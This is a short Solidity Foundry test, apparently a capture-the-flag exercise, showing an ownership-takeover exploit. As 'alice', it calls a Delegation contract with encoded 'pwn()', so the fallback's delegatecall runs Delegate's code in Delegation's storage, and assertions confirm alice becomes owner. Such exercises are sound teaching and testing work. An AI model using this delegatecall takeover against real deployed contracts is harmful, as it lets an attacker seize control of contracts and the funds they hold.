// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DelegateCall.sol";

contract DelegateTest is Test {
    Delegate delegate;
    Delegation delegation;
    address alice = makeAddr("alice");

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function test() public {
        assertEq(delegate.owner(), address(this));
        assertEq(delegation.owner(), address(this));

        vm.startPrank(alice);
        bytes memory data = abi.encodeWithSignature("pwn()");
        address(delegation).call(data);

        assertEq(delegate.owner(), address(this));
        assertEq(delegation.owner(), alice);

        delegate.pwn();

        assertEq(delegate.owner(), alice);
        assertEq(delegation.owner(), alice);
    }
}
